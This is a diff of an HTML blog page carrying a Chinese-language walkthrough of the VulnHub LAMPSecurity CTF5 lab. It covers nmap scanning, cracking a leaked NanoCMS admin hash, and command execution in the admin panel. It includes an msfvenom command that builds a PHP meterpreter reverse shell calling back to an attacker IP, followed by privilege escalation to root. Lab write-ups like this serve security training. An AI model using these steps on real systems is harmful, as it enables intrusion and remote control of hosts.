@@ -127,7 +127,7 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>[toc]</p>
-<h1 id="CTF5-靶场"><a href="#CTF5-靶场" class="headerlink" title="CTF5 靶场"></a>CTF5 靶场</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
+<h1><span id="ctf5-靶场">CTF5 靶场</span></h1><h2><span id="0-环境配置">0. 环境配置</span></h2><table>
 <thead>
 <tr>
 <th>主机</th>
@@ -144,39 +144,39 @@
 </tr>
 </tbody></table>
 <span id="more"></span>
-<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
+<h2><span id="1-netdiscover-同段主机存活主机探测">1. netdiscover 同段主机存活主机探测</span></h2><blockquote>
 <p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
 </blockquote>
 <p><img src="/images/image-20230317162053217.png" alt="image-20230317162053217"></p>
-<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
+<h2><span id="2-nmap主机开放服务探测">2. Nmap主机开放服务探测</span></h2><h3><span id="21-mini-rate-快速探测主机开放服务">2.1  mini-rate 快速探测主机开放服务</span></h3><blockquote>
 <p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.152</p>
 </blockquote>
 <p><img src="/images/image-20230317162537416.png" alt="image-20230317162537416"></p>
 <p>​	可以看出当前靶场开放较多端口，这里的话重点关注22、80、3306</p>
-<h3 id="2-2-TCP服务开放性探测"><a href="#2-2-TCP服务开放性探测" class="headerlink" title="2.2 TCP服务开放性探测"></a>2.2 TCP服务开放性探测</h3><blockquote>
+<h3><span id="22-tcp服务开放性探测">2.2 TCP服务开放性探测</span></h3><blockquote>
 <p>sudo nmap -sT -sV -sC -A -O -p- 192.168.134.152</p>
 </blockquote>
 <p><img src="/images/image-20230317162830184.png" alt="image-20230317162830184"></p>
-<h3 id="2-3-UDP服务开放性探测"><a href="#2-3-UDP服务开放性探测" class="headerlink" title="2.3 UDP服务开放性探测"></a>2.3 UDP服务开放性探测</h3><blockquote>
+<h3><span id="23-udp服务开放性探测">2.3 UDP服务开放性探测</span></h3><blockquote>
 <p>sudo nmap –min-rate 10000 -p- sU -v 192.168.134.152</p>
 </blockquote>
 <p><img src="/images/image-20230317162506365.png" alt="image-20230317162506365"></p>
-<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
+<h3><span id="24-服务端vuln脚本探测">2.4 服务端vuln脚本探测</span></h3><blockquote>
 <p>sudo nmap –script&#x3D;vuln -p 22,25,80,110,111,139,143,445,901,3306,50156 192.168.134.152</p>
 </blockquote>
 <p><img src="/images/image-20230317163344786.png" alt="image-20230317163344786"></p>
 <p>​	发现存在phpmyadmin目录，也发现了其他几个可能存在敏感信息泄漏的文件，例如info.php</p>
-<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对80端口web服务进行测试"><a href="#3-1-根据Nmap扫描结果，对80端口web服务进行测试" class="headerlink" title="3.1.  根据Nmap扫描结果，对80端口web服务进行测试"></a>3.1.  根据Nmap扫描结果，对80端口web服务进行测试</h3><h4 id="3-1-1-访问-http-192-168-70-193-info-php"><a href="#3-1-1-访问-http-192-168-70-193-info-php" class="headerlink" title="3.1.1 访问 http://192.168.70.193/info.php:"></a>3.1.1 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/info.php">http://192.168.70.193/info.php</a>:</h4><p><img src="/images/image-20240314182459680.png" alt="image-20240314182459680"></p>
-<h4 id="3-1-2-访问-http-192-168-70-193-phpmyadmin"><a href="#3-1-2-访问-http-192-168-70-193-phpmyadmin" class="headerlink" title="3.1.2 访问 http://192.168.70.193/phpmyadmin:"></a>3.1.2 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/phpmyadmin">http://192.168.70.193/phpmyadmin</a>:</h4><p><img src="/images/image-20240314182522165.png" alt="image-20240314182522165"></p>
-<h4 id="3-1-3-访问-http-192-168-70-193-inc-php"><a href="#3-1-3-访问-http-192-168-70-193-inc-php" class="headerlink" title="3.1.3 访问 http://192.168.70.193/inc.php:"></a>3.1.3 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/inc.php">http://192.168.70.193/inc.php</a>:</h4><p><img src="/images/image-20240314182622132.png" alt="image-20240314182622132"></p>
-<h4 id="3-1-4-访问-http-192-168-70-193-andy-index-php"><a href="#3-1-4-访问-http-192-168-70-193-andy-index-php" class="headerlink" title="3.1.4 访问 http://192.168.70.193/~andy/index.php:"></a>3.1.4 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php">http://192.168.70.193/~andy/index.php</a>:</h4><blockquote>
+<h2><span id="3-渗透测试">3. 渗透测试</span></h2><h3><span id="31-根据nmap扫描结果对80端口web服务进行测试">3.1.  根据Nmap扫描结果，对80端口web服务进行测试</span></h3><h4><span id="311-访问-http19216870193infophp">3.1.1 访问 :</span></h4><p><img src="/images/image-20240314182459680.png" alt="image-20240314182459680"></p>
+<h4><span id="312-访问-http19216870193phpmyadmin">3.1.2 访问 :</span></h4><p><img src="/images/image-20240314182522165.png" alt="image-20240314182522165"></p>
+<h4><span id="313-访问-http19216870193incphp">3.1.3 访问 :</span></h4><p><img src="/images/image-20240314182622132.png" alt="image-20240314182622132"></p>
+<h4><span id="314-访问-http19216870193~andyindexphp">3.1.4 访问 :</span></h4><blockquote>
 <p>可以发现当点击Navigation时，不同的页面调整是通过page参数控制的:</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.134.152/~andy/index.php?page=home">http://192.168.134.152/~andy/index.php?page=home</a></p>
 </blockquote>
 <p><img src="/images/image-20230322091931405.png" alt="image-20230322091931405"></p>
-<h3 id="3-2-NanoCMS-HASH泄露"><a href="#3-2-NanoCMS-HASH泄露" class="headerlink" title="3.2 NanoCMS HASH泄露"></a>3.2 NanoCMS HASH泄露</h3><h4 id="3-2-1-CMS-框架识别"><a href="#3-2-1-CMS-框架识别" class="headerlink" title="3.2.1 CMS 框架识别"></a>3.2.1 CMS 框架识别</h4><p>​	在<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php%E9%A1%B5%E9%9D%A2%E4%B8%ADF12%E6%89%93%E5%BC%80%E6%8E%A7%E5%88%B6%E5%8F%B0%EF%BC%8C%E5%9C%A8/">http://192.168.70.193/~andy/index.php页面中F12打开控制台，在\</a>&lt;meta&gt;标签中泄露了当前页面所使用的是 NanoCMS</p>
+<h3><span id="32-nanocms-hash泄露">3.2 NanoCMS HASH泄露</span></h3><h4><span id="321-cms-框架识别">3.2.1 CMS 框架识别</span></h4><p>​	在<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php%E9%A1%B5%E9%9D%A2%E4%B8%ADF12%E6%89%93%E5%BC%80%E6%8E%A7%E5%88%B6%E5%8F%B0%EF%BC%8C%E5%9C%A8/">http://192.168.70.193/~andy/index.php页面中F12打开控制台，在\</a>&lt;meta&gt;标签中泄露了当前页面所使用的是 NanoCMS</p>
 <p><img src="/images/image-20240314154429622.png" alt="image-20240314154429622"></p>
-<h4 id="3-2-2-NanoCMS-历史漏洞"><a href="#3-2-2-NanoCMS-历史漏洞" class="headerlink" title="3.2.2 NanoCMS 历史漏洞"></a>3.2.2 NanoCMS 历史漏洞</h4><p>​	在一些公开的漏洞库中可以查询到NanoCMS在低版本中存在漏洞，我们可以通过<code>NanoCMS密码hash泄露</code>获取到我们想要的管理员信息，访问<code>http://192.168.134.152/~andy/data/pagesdata.txt</code>，对password字段进行md5解密获取到以下信息:</p>
+<h4><span id="322-nanocms-历史漏洞">3.2.2 NanoCMS 历史漏洞</span></h4><p>​	在一些公开的漏洞库中可以查询到NanoCMS在低版本中存在漏洞，我们可以通过<code>NanoCMS密码hash泄露</code>获取到我们想要的管理员信息，访问<code>http://192.168.134.152/~andy/data/pagesdata.txt</code>，对password字段进行md5解密获取到以下信息:</p>
 <p><img src="/images/image-20230322092821310.png" alt="image-20230322092821310"></p>
 <p>​	对获取到的password的hash值进行判断，使用的加密方式</p>
 <blockquote>
@@ -193,13 +193,13 @@
 <p>username: admin</p>
 <p>password: shannon</p>
 </blockquote>
-<h3 id="3-3-前端后台获取shell"><a href="#3-3-前端后台获取shell" class="headerlink" title="3.3 前端后台获取shell"></a>3.3 前端后台获取shell</h3><h4 id="3-3-1-登录前端后台"><a href="#3-3-1-登录前端后台" class="headerlink" title="3.3.1 登录前端后台"></a>3.3.1 登录前端后台</h4><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php?page=home%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%88%B0%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8Login%E6%8E%A5%E5%8F%A3">http://192.168.70.193/~andy/index.php?page=home，观察到当前页面存在Login接口</a></p>
+<h3><span id="33-前端后台获取shell">3.3 前端后台获取shell</span></h3><h4><span id="331-登录前端后台">3.3.1 登录前端后台</span></h4><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php?page=home%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%88%B0%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8Login%E6%8E%A5%E5%8F%A3">http://192.168.70.193/~andy/index.php?page=home，观察到当前页面存在Login接口</a></p>
 <p><img src="/images/image-20240314155208870.png" alt="image-20240314155208870"></p>
 <p>​		点击‘Admin Login’，跳转到<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/data/nanoadmin.php%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%8A%E9%9D%A2%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://192.168.70.193/~andy/data/nanoadmin.php，使用上面泄露出来的账号密码进行登录</a></p>
 <p><img src="/images/image-20240314155316769.png" alt="image-20240314155316769"></p>
 <p>​		对Admin界面的功能点进行一波测试</p>
 <p><img src="/images/image-20230322093129087.png" alt="image-20230322093129087"></p>
-<h4 id="3-3-2-管理员后台命令执行漏洞"><a href="#3-3-2-管理员后台命令执行漏洞" class="headerlink" title="3.3.2 管理员后台命令执行漏洞"></a>3.3.2 管理员后台命令执行漏洞</h4><p>​		这里重点关注‘New Page’功能模块，这里存在这一处命令执行漏洞，下面是验证过程：</p>
+<h4><span id="332-管理员后台命令执行漏洞">3.3.2 管理员后台命令执行漏洞</span></h4><p>​		这里重点关注‘New Page’功能模块，这里存在这一处命令执行漏洞，下面是验证过程：</p>
 <p><img src="/images/image-20230322093224661.png" alt="image-20230322093224661"></p>
 <p>​		创建页面成功后，就提示你新的页面在 pages&#x2F;echo-hello.php</p>
 <p><img src="/images/image-20230322093308863.png" alt="image-20230322093308863"></p>
@@ -217,14 +217,14 @@
 </li>
 </ol>
 </blockquote>
-<h3 id="3-4-MSF生成PHP后门GetShell"><a href="#3-4-MSF生成PHP后门GetShell" class="headerlink" title="3.4 MSF生成PHP后门GetShell"></a>3.4 MSF生成PHP后门GetShell</h3><h4 id="3-4-1-生成PHP反弹shell的后门代码"><a href="#3-4-1-生成PHP反弹shell的后门代码" class="headerlink" title="3.4.1 生成PHP反弹shell的后门代码"></a>3.4.1 生成PHP反弹shell的后门代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.134.147 LPORT=4444 -f raw</span><br></pre></td></tr></table></figure>
+<h3><span id="34-msf生成php后门getshell">3.4 MSF生成PHP后门GetShell</span></h3><h4><span id="341-生成php反弹shell的后门代码">3.4.1 生成PHP反弹shell的后门代码</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.134.147 LPORT=4444 -f raw</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/image-20230322093806689.png" alt="image-20230322093806689"></p>
-<h4 id="3-4-2-New-Page-上传后门代码"><a href="#3-4-2-New-Page-上传后门代码" class="headerlink" title="3.4.2 New Page 上传后门代码"></a>3.4.2 New Page 上传后门代码</h4><p><img src="/images/image-20230322093915630.png" alt="image-20230322093915630"></p>
-<h4 id="3-4-3-设置MSFCONSOLE监听"><a href="#3-4-3-设置MSFCONSOLE监听" class="headerlink" title="3.4.3 设置MSFCONSOLE监听"></a>3.4.3 设置MSFCONSOLE监听</h4><p><img src="/images/image-20230322094241882.png" alt="image-20230322094241882"></p>
-<h4 id="3-4-4-访问后门文件，成功反弹shell"><a href="#3-4-4-访问后门文件，成功反弹shell" class="headerlink" title="3.4.4 访问后门文件，成功反弹shell"></a>3.4.4 访问后门文件，成功反弹shell</h4><p>​		经过简单的测试发现当前用户为apache，所以我们需要对此进行提权</p>
+<h4><span id="342-new-page-上传后门代码">3.4.2 New Page 上传后门代码</span></h4><p><img src="/images/image-20230322093915630.png" alt="image-20230322093915630"></p>
+<h4><span id="343-设置msfconsole监听">3.4.3 设置MSFCONSOLE监听</span></h4><p><img src="/images/image-20230322094241882.png" alt="image-20230322094241882"></p>
+<h4><span id="344-访问后门文件成功反弹shell">3.4.4 访问后门文件，成功反弹shell</span></h4><p>​		经过简单的测试发现当前用户为apache，所以我们需要对此进行提权</p>
 <p><img src="/images/image-20230322094553555.png" alt="image-20230322094553555"></p>
-<h4 id="3-4-5-隐藏日志，成功获取到root权限"><a href="#3-4-5-隐藏日志，成功获取到root权限" class="headerlink" title="3.4.5 隐藏日志，成功获取到root权限"></a>3.4.5 隐藏日志，成功获取到root权限</h4><p>​		对所有文件路径一次访问，在<code>/home/patrick</code>目录下发现隐藏文件路径，</p>
+<h4><span id="345-隐藏日志成功获取到root权限">3.4.5 隐藏日志，成功获取到root权限</span></h4><p>​		对所有文件路径一次访问，在<code>/home/patrick</code>目录下发现隐藏文件路径，</p>
 <p><img src="/images/image-20230322094717490.png" alt="image-20230322094717490"></p>
 <p>​		这里我们需要了解一下什么是”tomboy”，这样也就知道了我们为什么要关注tomboy这个文件夹</p>
 <blockquote>
@@ -233,14 +233,14 @@
 <p>​		我们查看便签中的最新记录，就可以发现root用户的账号密码</p>
 <p><img src="/images/image-20230322094910413.png" alt="image-20230322094910413"></p>
 <blockquote>
-<h3 id="切换管理员账号"><a href="#切换管理员账号" class="headerlink" title="切换管理员账号"></a>切换管理员账号</h3><p>su root </p>
+<h3><span id="切换管理员账号">切换管理员账号</span></h3><p>su root </p>
 </blockquote>
 <p><img src="/images/image-20230322095518004.png" alt="image-20230322095518004"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="cluavwuoy00152hvd85e32vgf" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="clw0dhqtf0017nbvdhyw4dk9s" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -284,7 +284,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Permission/" rel="tag">Permission</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Post/" rel="tag">Post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>
     </div>
   </div>
 
@@ -294,7 +294,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 14px;">ctf</a> <a href="/tags/error/" style="font-size: 12px;">error</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 12px;">pwn</a> <a href="/tags/python/" style="font-size: 12px;">python</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 18px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
+      <a href="/tags/Permission/" style="font-size: 10px;">Permission</a> <a href="/tags/Post/" style="font-size: 10px;">Post</a> <a href="/tags/ctf/" style="font-size: 14px;">ctf</a> <a href="/tags/error/" style="font-size: 12px;">error</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 12px;">pwn</a> <a href="/tags/python/" style="font-size: 12px;">python</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 18px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a>
     </div>
   </div>
 
@@ -303,7 +303,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
     </div>
   </div>
 
@@ -314,6 +314,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2024/05/10/Windows-Post-Infiltration-Permission-Maintenance-lnk/">Windows_Post_Infiltration_Permission_Maintenance_lnk</a>
+          </li>
         
           <li>
             <a href="/2024/03/28/vulnhub-LAMPSecurity-CTF6/">vulnhub-LAMPSecurity-CTF6</a>
@@ -329,10 +333,6 @@
         
           <li>
             <a href="/2024/03/28/web-RCE-phpstudy-JS2RCE/">web-RCE-phpstudy-JS2RCE</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/26/reverse-RCE-phpstudy-xmlrpc/">reverse-RCE-phpstudy-xmlrpc</a>
           </li>
         
       </ul>
